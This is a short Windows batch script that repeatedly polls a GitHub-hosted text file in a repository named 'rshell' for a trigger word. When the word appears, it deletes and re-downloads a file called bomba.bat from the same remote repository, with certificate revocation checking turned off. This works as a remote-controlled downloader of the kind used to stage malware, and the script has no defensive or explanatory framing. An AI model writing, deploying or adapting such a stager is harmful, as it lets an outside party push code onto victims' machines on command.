:loop
curl -L https://github.com/jtenara/rshell/blob/main/test.txt | findstr "downloadnowplease">Nul 
if not errorlevel 1 (echo sigma sigma worked
del bomba.bat
curl --output bomba.bat -L --ssl-no-revoke https://github.com/jtenara/rshell/blob/main/bomba.bat
) else (
timeout /t 1
goto loop)

pause